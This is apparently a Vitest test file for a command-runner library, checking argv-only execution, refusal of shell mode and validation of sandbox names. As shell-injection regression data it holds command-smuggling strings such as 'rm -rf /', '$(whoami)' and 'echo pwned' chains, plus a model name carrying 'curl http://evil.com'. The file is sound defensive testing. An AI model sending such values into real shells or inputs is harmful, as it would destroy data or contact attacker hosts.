// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import { createRequire } from "module";
import { describe, expect, it } from "vitest";

const require = createRequire(import.meta.url);
const runner = require("../../dist/lib/runner");

describe("run with argv array", () => {
  it("executes a simple command and returns result", () => {
    const result = runner.run(["echo", "hello"], { suppressOutput: true });
    expect(result.status).toBe(0);
  });

  it("throws when argv array is empty", () => {
    expect(() => runner.run([])).toThrow(/must not be empty/);
  });

  it("returns non-zero status with ignoreError", () => {
    const result = runner.run(["false"], { ignoreError: true, suppressOutput: true });
    expect(result.status).not.toBe(0);
  });

  it("passes extra env vars to the child process", () => {
    const result = runner.run(["env"], {
      env: { NEMOCLAW_TEST_VAR: "injection-safe" },
      suppressOutput: true,
    });
    expect(result.status).toBe(0);
    expect(result.stdout.toString()).toContain("NEMOCLAW_TEST_VAR=injection-safe");
  });

  it("rejects shell: true to prevent security bypass", () => {
    expect(() => runner.run(["echo", "hi"], { shell: true })).toThrow(/shell option is forbidden/);
  });

  it("does not interpret shell metacharacters in arguments", () => {
    // If shell interpretation occurred, $(whoami) would be expanded
    const result = runner.runCapture(["echo", "$(whoami)", "&&", "rm", "-rf", "/"], {
      ignoreError: true,
    });
    // echo receives literal argv — no shell expansion
    expect(result).toContain("$(whoami)");
    expect(result).toContain("&&");
    expect(result).toContain("rm");
  });

  it("rejects string commands", () => {
    expect(() => runner.run("echo hello", { suppressOutput: true })).toThrow(
      /argv array instead/,
    );
  });

  it("surfaces ENOENT error for missing executables", () => {
    const result = runner.run(["nonexistent-binary-xyz-12345"], {
      ignoreError: true,
      suppressOutput: true,
    });
    // spawnSync sets result.error for missing executables
    expect(result.error).toBeDefined();
    expect(result.error.code).toBe("ENOENT");
  });
});

describe("runShell", () => {
  it("runs an explicit shell command string", () => {
    const result = runner.runShell("echo hello", { suppressOutput: true });
    expect(result.status).toBe(0);
  });
});

describe("runInteractive with argv array", () => {
  it("executes an interactive argv command", () => {
    const result = runner.runInteractive(["echo", "hello"], { suppressOutput: true });
    expect(result.status).toBe(0);
  });

  it("rejects string commands", () => {
    expect(() => runner.runInteractive("echo hello", { suppressOutput: true })).toThrow(
      /argv array instead/,
    );
  });

  it("rejects shell: true to prevent security bypass", () => {
    expect(() => runner.runInteractive(["echo", "hello"], { shell: true })).toThrow(
      /shell option is forbidden/,
    );
  });
});

describe("runInteractiveShell", () => {
  it("runs an explicit interactive shell command string", () => {
    const result = runner.runInteractiveShell("echo hello", { suppressOutput: true });
    expect(result.status).toBe(0);
  });
});

describe("runCapture with argv array", () => {
  it("captures stdout from a simple command", () => {
    const output = runner.runCapture(["echo", "hello world"]);
    expect(output).toBe("hello world");
  });

  it("trims whitespace from output", () => {
    const output = runner.runCapture(["echo", "  trimmed  "]);
    expect(output).toBe("trimmed");
  });

  it("trims trailing blank lines so callers can safely parse the last line", () => {
    const output = runner.runCapture([
      process.execPath,
      "-e",
      'process.stdout.write("2048\\n\\n")',
    ]);
    expect(output).toBe("2048");
  });

  it("throws when argv array is empty", () => {
    expect(() => runner.runCapture([])).toThrow(/must not be empty/);
  });

  it("returns empty string on failure with ignoreError", () => {
    const output = runner.runCapture(["false"], { ignoreError: true });
    expect(output).toBe("");
  });

  it("throws on failure without ignoreError", () => {
    expect(() => runner.runCapture(["false"])).toThrow();
  });

  it("rejects shell: true to prevent security bypass", () => {
    expect(() => runner.runCapture(["echo", "hi"], { shell: true })).toThrow(
      /shell option is forbidden/,
    );
  });

  it("prevents shell injection via argument values", () => {
    // Dangerous sandbox name that would cause injection with shell strings
    const maliciousName = 'alpha"; rm -rf / #';
    const output = runner.runCapture(["echo", maliciousName]);
    // With argv, the string is passed literally — no shell interpretation
    expect(output).toBe(maliciousName);
  });

  it("prevents injection via dollar-sign expansion", () => {
    const output = runner.runCapture(["echo", "${HOME}"]);
    // Literal ${HOME}, not expanded
    expect(output).toBe("${HOME}");
  });

  it("prevents injection via backtick expansion", () => {
    const output = runner.runCapture(["echo", "`whoami`"]);
    // Literal backticks, not expanded
    expect(output).toBe("`whoami`");
  });

  it("handles arguments with spaces and special characters", () => {
    const output = runner.runCapture(["echo", "hello world", "foo bar"]);
    expect(output).toBe("hello world foo bar");
  });

  it("passes extra env to the child process", () => {
    const output = runner.runCapture(["env"], { env: { TEST_ARGV_ENV: "captured" } });
    expect(output).toContain("TEST_ARGV_ENV=captured");
  });

  it("rejects string commands", () => {
    expect(() => runner.runCapture("echo hello")).toThrow(/argv array instead/);
  });

  it("throws ENOENT for missing executables", () => {
    expect(() => runner.runCapture(["nonexistent-binary-xyz-12345"])).toThrow();
  });

  it("returns empty string for missing executables with ignoreError", () => {
    const output = runner.runCapture(["nonexistent-binary-xyz-12345"], { ignoreError: true });
    expect(output).toBe("");
  });
});

describe("runFile", () => {
  it("runs a program by file path with args", () => {
    const result = runner.runFile(process.execPath, ["-e", "process.exit(0)"], {
      suppressOutput: true,
    });
    expect(result.status).toBe(0);
  });

  it("throws when shell: true is passed", () => {
    expect(() => runner.runFile("/bin/echo", ["hi"], { shell: true })).toThrow(
      /does not allow opts\.shell=true/,
    );
  });

  it("converts non-string args to strings", () => {
    const result = runner.runFile("/bin/echo", [42, true, "hello"], {
      suppressOutput: true,
    });
    expect(result.status).toBe(0);
  });
});

describe("runCaptureEx", () => {
  it("returns structured result with stdout on success", () => {
    const result = runner.runCaptureEx(["/bin/echo", "hello world"]);
    expect(result.stdout).toBe("hello world");
    expect(result.exitCode).toBe(0);
    expect(result.timedOut).toBe(false);
  });

  it("throws on empty argv array", () => {
    expect(() => runner.runCaptureEx([])).toThrow(/must be a non-empty/);
  });

  it("returns stderr when available", () => {
    const result = runner.runCaptureEx([
      process.execPath,
      "-e",
      'process.stderr.write("error msg\\n"); process.stdout.write("output"); process.exit(0);',
    ]);
    // stderr may be empty or contain the message depending on capture
    expect(typeof result.stderr).toBe("string");
    expect(result.stdout).toBe("output");
  });

  it("captures non-zero exit code", () => {
    const result = runner.runCaptureEx(["sh", "-c", "exit 42"]);
    expect(result.exitCode).toBe(42);
  });
});

describe("validateName", () => {
  it("accepts valid RFC 1123 names", () => {
    expect(runner.validateName("my-sandbox")).toBe("my-sandbox");
    expect(runner.validateName("sandbox-123")).toBe("sandbox-123");
    expect(runner.validateName("a")).toBe("a");
  });

  it("rejects empty name", () => {
    expect(() => runner.validateName("")).toThrow(/required/);
    expect(() => runner.validateName(" ", "label")).toThrow(/Invalid/);
  });

  it("rejects overly long names", () => {
    const longName = "a".repeat(300);
    expect(() => runner.validateName(longName)).toThrow(/too long/);
  });

  it("rejects names with shell metacharacters", () => {
    expect(() => runner.validateName("bad;name")).toThrow(/Invalid/);
    expect(() => runner.validateName("bad$(whoami)")).toThrow(/Invalid/);
    expect(() => runner.validateName("bad`id`")).toThrow(/Invalid/);
    expect(() => runner.validateName("bad&name")).toThrow(/Invalid/);
    expect(() => runner.validateName("bad|name")).toThrow(/Invalid/);
  });

  it("rejects names with path traversal", () => {
    expect(() => runner.validateName("../etc")).toThrow(/Invalid/);
  });

  it("uses custom label in error messages", () => {
    expect(() => runner.validateName("", "sandbox")).toThrow(/sandbox/);
  });
});

describe("shell injection regression tests", () => {
  it("sandbox names with shell metacharacters are safe with argv arrays", () => {
    // These names would cause injection if passed through bash -c
    const dangerousNames = [
      "my-sandbox; rm -rf /",
      "test$(whoami)",
      "sandbox`id`",
      "sandbox' || echo pwned",
      'sandbox" && echo pwned',
      "sandbox\necho pwned",
    ];

    for (const name of dangerousNames) {
      const output = runner.runCapture(["echo", name], { ignoreError: true });
      // Each name should be passed literally, not interpreted
      expect(output).toContain(name.split("\n")[0]);
    }
  });

  it("model names with shell metacharacters are safe with argv arrays", () => {
    const output = runner.runCapture(["echo", "nvidia/model;curl http://evil.com"]);
    expect(output).toBe("nvidia/model;curl http://evil.com");
  });
});
